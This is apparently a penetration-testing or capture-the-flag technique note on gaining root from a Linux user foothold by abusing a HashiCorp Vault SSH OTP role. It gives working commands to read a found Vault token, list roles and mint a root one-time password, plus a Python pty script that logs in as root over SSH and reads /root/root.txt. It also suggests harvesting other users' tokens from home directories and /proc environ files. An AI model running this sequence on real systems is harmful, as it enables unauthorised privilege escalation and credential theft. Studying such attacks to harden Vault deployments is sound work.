# Vault SSH OTP Role Abuse from a User Foothold

## When this applies

- Linux foothold as a user with read-access to a HashiCorp Vault token (commonly `~/.vault-token`).
- Vault has the SSH secrets backend configured with an OTP role that defaults to `root` (or another high-privilege account):
  ```
  vault write ssh/roles/<role> key_type=otp default_user=root cidr_list=0.0.0.0/0
  ```
- The Vault listener is reachable from the foothold (commonly `localhost:8200` or an internal docker-compose hostname).

## Detect the role

```bash
VAULT_TOKEN=$(cat ~/.vault-token)
export VAULT_ADDR=https://<VAULT_HOST>:8200
vault token lookup -tls-skip-verify
vault list -tls-skip-verify ssh/roles
vault read -tls-skip-verify ssh/roles/<role>     # confirm key_type=otp, default_user=root, cidr_list
```

The repo where you found the token typically also contains `vault/secrets.sh` enumerating the role definitions.

## Generate an OTP

```bash
OTP=$(VAULT_TOKEN=$(cat ~/.vault-token) vault write -tls-skip-verify \
        -address=https://<VAULT_HOST>:8200 \
        -field=key ssh/creds/<role> ip=127.0.0.1)
echo "$OTP"
```

Critical: the OTP is bound to the `ip` you pass. SSH must originate **from that IP** — typically `127.0.0.1` because the role policy was written for "localhost-only loopback root SSH". Connecting to a public interface from your attacker box won't authenticate, even with a valid OTP.

## Use the OTP

The SSH server uses keyboard-interactive PAM with `pam_ssh_otp` (or similar). `PreferredAuthentications=password` alone is often refused — set it to `keyboard-interactive,password`.

If the foothold has neither `sshpass` nor `expect`, drive the prompt with a stdlib-only Python helper:

```python
# /tmp/dossh.py — reads OTP from argv, types it after seeing "Password:"
import pty, os, sys, time
otp = sys.argv[1]
def expect(fd, pat, t=12):
    buf = b''; deadline = time.time() + t
    while time.time() < deadline:
        try:
            r = os.read(fd, 4096)
            if not r: break
            buf += r
            sys.stdout.write(r.decode(errors='replace')); sys.stdout.flush()
            if pat and pat.encode() in buf: return buf
        except OSError: break
    return buf
pid, fd = pty.fork()
if pid == 0:
    os.execvp('ssh', ['ssh',
        '-o', 'StrictHostKeyChecking=no',
        '-o', 'UserKnownHostsFile=/dev/null',
        '-o', 'PubkeyAuthentication=no',
        '-o', 'PreferredAuthentications=keyboard-interactive,password',
        'root@127.0.0.1', 'id; cat /root/root.txt'])
expect(fd, 'assword:')
os.write(fd, otp.encode() + b'\r')
expect(fd, '', 8)
```

```bash
python /tmp/dossh.py "$OTP"
```

## Pitfalls

- **OTPs are single-use.** If you got the prompt to `Password:` but auth failed, the OTP is consumed; regenerate before the next attempt.
- **The Vault token may be limited.** If `vault write ssh/creds/<role>` returns "permission denied", the foothold token doesn't have the right policy. Look for additional tokens in `~/.vault-token`-style files belonging to other users you can pivot through, or in process environment (`/proc/<pid>/environ`).
- **`tls-skip-verify` matters.** Internal Vault is usually behind a self-signed cert; without `-tls-skip-verify` (or `VAULT_SKIP_VERIFY=true`), every command 500s.
- **Wrong `ip=` arg.** People reflexively type the box's external IP. The OTP role policy was almost certainly written for `127.0.0.1` because that's what `vault ssh` assumes when called from a foothold; mismatched IP = auth refused.

## Cross-references

- Pty-based password-prompt automation when `sshpass` / `expect` are missing — same helper applies to any keyboard-interactive prompt (`su`, `sudo -S` alternatives).
